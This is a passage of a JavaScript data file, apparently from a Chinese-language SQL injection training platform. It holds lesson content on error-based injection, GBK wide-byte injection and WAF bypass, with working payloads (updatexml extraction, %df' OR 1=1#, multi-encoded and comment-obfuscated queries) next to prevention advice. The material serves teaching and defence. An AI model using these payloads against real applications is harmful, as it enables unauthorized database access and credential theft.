            commonErrors: [
                {
                    title: '错误函数选择',
                    description: '不同数据库支持的报错函数不同，使用了不支持的函数会导致注入失败。',
                    example: `-- MySQL中不支持
SELECT * FROM users WHERE id=1 AND CTXSYS.DRITHSX.SN(1,2)=1`
                },
                {
                    title: '数据长度限制',
                    description: '某些报错函数对数据长度有限制，超出限制可能导致注入失败。',
                    example: `-- 数据可能被截断
AND updatexml(1,concat(0x7e,(SELECT REPEAT(password,100) FROM users LIMIT 1),0x7e),1)`
                },
                {
                    title: '特殊字符处理',
                    description: '报错信息中的特殊字符可能被转义或过滤，影响结果的读取。',
                    example: `建议使用hex编码处理特殊字符`
                }
            ],
            prevention: [
                {
                    title: '错误信息控制',
                    description: '在生产环境中禁用详细的错误信息输出，使用自定义错误页面。',
                    example: `// 配置生产环境错误处理
app.use((err, req, res, next) => {
    res.status(500).send("Internal Server Error");
});`
                },
                {
                    title: '参数化查询',
                    description: '使用参数化查询可以有效防止各类SQL注入，包括报错注入。',
                    example: `const query = "SELECT * FROM users WHERE id = ?";
db.query(query, [userId]);`
                },
                {
                    title: '最小权限原则',
                    description: '限制数据库用户的权限，禁止访问不必要的系统表和函数。',
                    example: `REVOKE EXECUTE ON sys.* FROM app_user;`
                }
            ]
        }
    },
    {
        id: 11,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例：利用宽字节特性绕过过滤
尝试使用宽字节编码绕过单引号转义
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: '宽字节注入原理',
                    description: '宽字节注入利用字符编码的特性来绕过对特殊字符的转义。当使用GBK等宽字节编码时，可能会影响转义字符的处理。',
                    examples: `-- 原始SQL
SELECT * FROM users WHERE id=1 AND username='%df' OR 1=1#'

-- 经过转义后
SELECT * FROM users WHERE id=1 AND username='%df\\' OR 1=1#'`
                },
                {
                    title: '字符编码影响',
                    description: '不同的字符编码（如UTF-8、GBK）对字符的处理方式不同，这会影响SQL注入的成功率。',
                    examples: `-- GBK编码示例
%df' => %df%5c%27 => 運' (成功闭合引号)

-- UTF-8编码示例
%df' => %df%5c%27 (转义仍然有效)`
                },
                {
                    title: '常见编码点',
                    description: '某些特定的字符编码点可以用来触发宽字节注入，如0xbf、0x5c等。',
                    examples: `-- 使用不同编码点
%bf' OR 1=1#
%df' OR 1=1#
%aa' OR 1=1#`
                },
                {
                    title: 'URL编码配合',
                    description: '宽字节注入常需要配合URL编码使用，以确保特殊字符能正确传输。',
                    examples: `-- URL编码示例
username=%df%27%20OR%201=1%23

-- 双重编码
username=%25df%2527%20OR%201=1%23`
                }
            ],
            commonErrors: [
                {
                    title: '编码判断错误',
                    description: '没有正确判断目标系统使用的字符编码，导致注入失败。',
                    example: `在UTF-8环境下尝试GBK宽字节注入`
                },
                {
                    title: 'URL编码使用不当',
                    description: '未正确使用URL编码或使用了错误的编码方式。',
                    example: `错误：直接使用原始字符
正确：使用URL编码后的值`
                },
                {
                    title: '特殊字符处理不当',
                    description: '某些特殊字符可能会影响宽字节注入的效果。',
                    example: `需要考虑换行符、制表符等特殊字符的影响`
                }
            ],
            prevention: [
                {
                    title: '统一字符编码',
                    description: '在整个应用中统一使用UTF-8编码，避免编码转换问题。',
                    example: `// 设置数据库连接编码
SET NAMES utf8mb4;

// 设置HTTP响应编码
res.setHeader('Content-Type', 'text/html; charset=utf-8');`
                },
                {
                    title: '参数化查询',
                    description: '使用参数化查询可以避免宽字节注入问题。',
                    example: `const query = "SELECT * FROM users WHERE username = ?";
db.query(query, [username]);`
                },
                {
                    title: '输入编码检查',
                    description: '对输入进行严格的编码检查，拒绝不合法的字符编码。',
                    example: `function isValidEncoding(str) {
    return Buffer.from(str).toString('utf8').length === str.length;
}`
                }
            ]
        }
    },
    {
        id: 12,
        preCheck: {
            tables: ['users'],
            schema: `
用户表(users)结构：
- id: INTEGER (主键)
- username: TEXT (用户名)
- password: TEXT (密码)
- email: TEXT (邮箱)
- is_admin: INTEGER (是否管理员)
            `,
            sampleData: `
示例：绕过WAF规则
尝试使用各种技巧绕过WAF的SQL注入检测
            `
        },
        knowledge: {
            keyPoints: [
                {
                    title: 'WAF绕过基础',
                    description: 'Web应用防火墙(WAF)通过规则匹配来检测和阻止SQL注入攻击。了解WAF的工作原理有助于找到绕过方法。',
                    examples: `-- 常见WAF绕过技术
1) 使用注释
/**/SELECT/**/password/**/FROM/**/users

2) 大小写混合
SeLeCt password FrOm users

3) 编码变换
SELECT char(112,97,115,115,119,111,114,100) FROM users`
                },
                {
                    title: '等价替换技巧',
                    description: '使用功能相同但形式不同的SQL语句来绕过WAF的规则匹配。',
                    examples: `-- 字符串连接
SELECT 'a''b' = 'ab'

-- 运算符替换
1 = 1 等价于 1 IN (1)

-- 函数替换
SUBSTRING(str,1,1) 等价于 LEFT(str,1)`
                },
                {
                    title: '特殊字符利用',
                    description: '利用特殊字符和编码来混淆SQL语句，使WAF无法正确识别。',
                    examples: `-- Unicode编码
SELECT password FROM users WHERE username = %u0075%u0073%u0065%u0072

-- 双重URL编码
SELECT%252520password%252520FROM%252520users`
                },
                {
                    title: '逻辑重构',
                    description: '重构SQL语句的逻辑，保持功能相同但改变形式，以绕过WAF的规则。',
                    examples: `-- 条件重构
id=1 OR 1=1
变为
id>0 AND id=1 OR id>0

-- 使用CASE
CASE WHEN (1=1) THEN true ELSE false END`
                }
            ],
            commonErrors: [
                {
                    title: '绕过方法选择不当',
                    description: '选择了不适合目标WAF的绕过方法，或者使用了已被WAF识别的绕过技术。',
                    example: `错误：盲目使用常见绕过方法
正确：先测试WAF规则，再选择合适的绕过方法`
                },
                {
                    title: '编码使用错误',
                    description: '错误使用编码方式或编码层次，导致WAF绕过失败。',
                    example: `错误：SELECT%20password%20FROM%20users -- 简单URL编码容易被检测
正确：SELECT%252520password%252520FROM%252520users -- 多重编码`
                },
                {
                    title: '规则理解不足',
                    description: '对WAF规则理解不够深入，导致绕过尝试无效。',
                    example: `错误：仅改变大小写
正确：结合使用多种技术，如编码+注释+大小写`
                }
            ],
            prevention: [
                {
                    title: '多层防护',
                    description: '不要仅依赖WAF，应该实施多层防护机制。',
                    example: `1. 参数化查询
2. 输入验证
3. WAF
4. 最小权限
5. 监控告警`
                },
                {
                    title: 'WAF规则更新',
                    description: '定期更新WAF规则，及时修补已知的绕过方法。',
                    example: `// 定期检查和更新WAF规则
modsecurity_rules_update.sh
waf_rule_version_check.sh`
                },
                {
                    title: '日志分析',
                    description: '持续监控和分析WAF日志，识别潜在的绕过尝试。',
                    example: `// WAF日志分析示例
grep "SQL Injection" /var/log/waf/access.log | analyze_patterns.sh`
                }
            ]
        }
    }
];

module.exports = { LEVEL_DETAILS }; 